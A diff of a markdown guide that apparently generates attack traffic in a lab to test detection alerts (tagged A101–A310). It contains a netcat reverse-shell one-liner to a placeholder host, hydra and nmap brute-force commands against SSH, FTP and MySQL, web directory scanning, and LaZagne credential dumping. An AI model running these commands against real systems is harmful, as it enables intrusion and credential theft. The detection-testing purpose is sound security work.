@@ -660,7 +660,7 @@ Reference : <https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Met
 nc -nlvp 8080
 ```
 
-## On the victim system
+## On the victim system (A310)
 | The second step is to connect to the attacker and give acces to the victim shell
 ```
 rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc x.x.x.x 8080 >/tmp/f
@@ -673,7 +673,7 @@ rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc x.x.x.x 8080 >/tmp/f
 -->
 # GENERATE TRAFFIC FOR DIFFERENTS PROTOCOLS
 
-## GENERATE TRAFFIC - SSH bruteforce
+## GENERATE TRAFFIC - SSH bruteforce (A310)
 ```
 nmap -p 22 --script ssh-brute poly-db
 hydra -t 1 -V -f -I -l poly -P /usr/share/wordlists/rockyou.txt poly-db ssh
@@ -681,15 +681,17 @@ hydra -t 1 -V -f -I -l poly -P /usr/share/wordlists/rockyou.txt poly-db ssh
 
 ## GENERATE TRAFFIC - FTP bruteforce
 ```
+# -t : Number of parralel tasks
 hydra -t 1 -V -f -I -l poly -P /usr/share/wordlists/rockyou.txt poly-db ftp
 ```
 
 ## GENERATE TRAFFIC - MYSQL bruteforce
 ```
+# -t : Number of parralel tasks
 hydra -t 1 -V -f -I -l poly -P /usr/share/wordlists/rockyou.txt poly-db mysql
 ```
 
-## GENERATE TRAFFIC - MYSQL Request
+## GENERATE TRAFFIC - MYSQL Request (A200, A201)
 ```
 ->->->->->-> poly@poly-db:/var/log/mysql$ sudo mysql -u root
 
@@ -713,7 +715,7 @@ select * from utilisateurs where admin = 1;
 
 ```
 
-## GENERATE TRAFFIC - Web directory bruteforce
+## GENERATE TRAFFIC - Web directory bruteforce (A101, A102)
 ```
 dirbuster -u http://poly-apache
 nikto -h poly-apache
@@ -725,7 +727,7 @@ Reference : 'https://github.com/AlessandroZ/LaZagne'
 ```
 sudo python3 laZagne.py all -v
 ```
-## GENERATE TRAFFIC - LinEnum execution
+## GENERATE TRAFFIC - LinEnum execution (A300)
 Reference : 'https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh'
 
 ```
